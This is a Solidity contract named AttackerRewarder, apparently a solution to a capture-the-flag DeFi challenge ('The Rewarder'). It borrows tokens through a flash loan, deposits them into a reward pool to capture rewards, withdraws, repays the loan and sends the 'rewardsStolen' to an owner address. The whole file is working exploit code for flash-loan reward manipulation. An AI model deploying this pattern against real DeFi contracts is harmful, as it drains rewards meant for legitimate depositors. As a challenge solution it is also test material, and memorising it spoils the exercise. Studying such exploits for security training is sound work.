// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "@openzeppelin/contracts/utils/Address.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";


contract AttackerRewarder {
    using Address for address payable;
    address public rewardPool;
    address public flashLoanerPool;
    address public owner;
    constructor(address _rewardPool,address _flashLoanPool, address _owner) {
        rewardPool = _rewardPool;
        flashLoanerPool = _flashLoanPool;
        owner = _owner;
    }

    function receiveFlashLoan(uint256 amount) external {
        IERC20(FlashLoanerPool(flashLoanerPool).liquidityToken()).approve(rewardPool,amount);
        TheRewarderPool(rewardPool).deposit(amount);
        TheRewarderPool(rewardPool).withdraw(amount);
        IERC20(FlashLoanerPool(flashLoanerPool).liquidityToken()).transfer(flashLoanerPool,amount);
        uint rewardsStolen = IERC20(TheRewarderPool(rewardPool).rewardToken()).balanceOf(address(this));
        IERC20(TheRewarderPool(rewardPool).rewardToken()).transfer(owner,rewardsStolen);
    }

    function attack(address receiver, uint amount) external{
        FlashLoanerPool(flashLoanerPool).flashLoan(amount);
    }
}